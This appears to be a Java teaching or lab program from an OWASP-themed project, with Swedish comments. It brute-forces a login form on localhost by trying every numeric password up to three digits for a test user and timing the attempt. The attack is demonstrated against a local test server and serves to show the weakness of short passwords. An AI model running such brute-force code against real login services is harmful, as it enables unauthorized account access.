package com.example.owaspkryptering.PasswordBreachTest;

import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.slf4j.LoggerFactory;
import org.springframework.context.ApplicationContext;
import org.springframework.context.annotation.AnnotationConfigApplicationContext;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;

import java.util.ArrayList;
import java.util.List;
import java.util.logging.Logger;

public class BruteForceTester {

    static Logger logger = Logger.getLogger(BruteForceTester.class.getName());


        public static void main(String[] args) throws Exception {
            CloseableHttpClient httpClient = HttpClients.createDefault();

            String targetUrl = "http://localhost:8080/login"; // Serveradress och endpoint
            String targetUsername = "three@test.se"; // Användarnamn att testa
            String characters = "0123456789"; // Tecken som kan ingå
            int maxLength = 3; // Maximal längd på lösenordet

            // Timing
            long startTime = System.currentTimeMillis(); // Starta tidtagning

            logger.info("Starting brute force attack...");
            boolean success = bruteForceLoop(targetUsername, characters, maxLength, httpClient, targetUrl);

            long endTime = System.currentTimeMillis(); // Avsluta tidtagning
            long totalTime = endTime - startTime;

            if (success) {
                logger.info("Password cracked successfully!");
            } else {
                logger.info("Brute force attack finished. Password not cracked.");
            }

            int totalTimeInSeconds = (int) (totalTime / 1000);
            int totalTimeInMinutes = totalTimeInSeconds / 60;

            logger.info("Time taken: " + totalTime + " milliseconds (" + totalTimeInSeconds + " seconds, " + totalTimeInMinutes + " minutes)");

            httpClient.close();
        }

        private static boolean bruteForceLoop(String targetUsername, String characters, int maxLength, CloseableHttpClient httpClient, String targetUrl) throws Exception {
            for (int length = 1; length <= maxLength; length++) {
                if (bruteForceRecursive("", characters, length, targetUsername, httpClient, targetUrl)) {
                    return true;
                }
            }
            return false;
        }

        private static synchronized boolean bruteForceRecursive(String currentPassword, String characters, int length, String targetUsername, CloseableHttpClient httpClient, String targetUrl) throws Exception {
            if (length == 0) {

                List<NameValuePair> params = new ArrayList<>();
                params.add(new BasicNameValuePair("username", targetUsername));
                params.add(new BasicNameValuePair("password", currentPassword));

                HttpPost httpPost = new HttpPost(targetUrl);
                httpPost.setEntity(new UrlEncodedFormEntity(params));

                int statusCode = httpClient.execute(httpPost).getStatusLine().getStatusCode();
                String location = httpClient.execute(httpPost).getFirstHeader("Location").getValue();
                if (location.equals("http://localhost:8080/welcome") && statusCode == 302) {
                    logger.info("Login successful for user: " + targetUsername + " with password: " + currentPassword);
                    return true;
                }
//                logger.info("Login failed for user: " + targetUsername + " with password: " + currentPassword); // kommentera ut om längre lösenord ska testas
                return false;
            }

            for (char c : characters.toCharArray()) {
                if (bruteForceRecursive(currentPassword + c, characters, length - 1, targetUsername, httpClient, targetUrl)) {
                    return true;
                }
            }
            return false;
        }
    }








